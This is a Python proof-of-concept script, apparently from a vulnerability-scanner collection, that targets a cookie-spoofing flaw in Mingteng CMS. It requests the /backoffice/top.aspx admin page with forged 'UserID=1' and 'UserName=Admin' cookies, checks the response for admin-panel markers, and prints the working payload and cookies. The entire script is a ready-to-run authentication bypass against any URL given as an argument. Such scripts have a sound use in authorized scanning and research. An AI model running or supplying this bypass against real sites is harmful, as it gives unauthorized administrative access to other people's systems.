#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 明腾cms cookie欺骗漏洞
referer: unknown
author: Lucifer
description: 存在cookie欺骗漏洞,直接登录后台。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class mingteng_cookie_deception:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        payload = "/backoffice/top.aspx"
        vulnurl = self.url + payload
        try:
            mycookies = { "UserID":"1", "UserName":"Admin", "path":"/" }
            sess = requests.Session()
            req = sess.get(vulnurl, headers=headers, cookies=mycookies, timeout=10, verify=False)
            if r"Admin" in req.text and r"SysSet/Default.aspx" in req.text:
                printGreen("[+]Success:存在明腾cms cookie欺骗漏洞...(高危)\tpayload: "+vulnurl+"\t设置cookies为: "+str(mycookies))
            elif r"Admin" in req.text and r"PassWords.aspx" in req.text:
                printGreen("[+]Success:存在明腾cms cookie欺骗漏洞...(高危)\tpayload: "+vulnurl+"\t设置cookies为: "+str(mycookies))
            else:
                printBlue("[-]Info:不存在mingteng_cookie_deception漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = mingteng_cookie_deception(sys.argv[1])
    testVuln.run()
